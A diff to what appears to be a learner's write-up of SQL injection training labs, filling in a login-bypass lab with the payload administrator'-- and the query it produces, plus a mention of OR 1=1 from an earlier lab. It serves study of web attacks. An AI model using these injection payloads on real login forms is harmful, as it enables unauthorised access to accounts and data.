@@ -17,11 +17,20 @@ The single quote closes the category string. OR 1=1 makes the condition always t
 
 ## Lab 2 – Login Bypass
 
-**Payload:**
+**Payload:** `administrator'--`
 
-**SQL query produced:**
+**Password entered:** `test123`
+
+**SQL query produced (approximate):**
+
+```sql
+SELECT * FROM users WHERE username = 'administrator'--' AND password = 'test123';
+```
 
 **Why it worked:**
+The single quote closes the username string, and -- comments out the remaining SQL, including the password check. This allowed me to log in as administrator without knowing the real password.
+
+**Result:** Lab solved successfully.
 
 ## Lab 3 – UNION: Retrieve Data from Other Tables
 
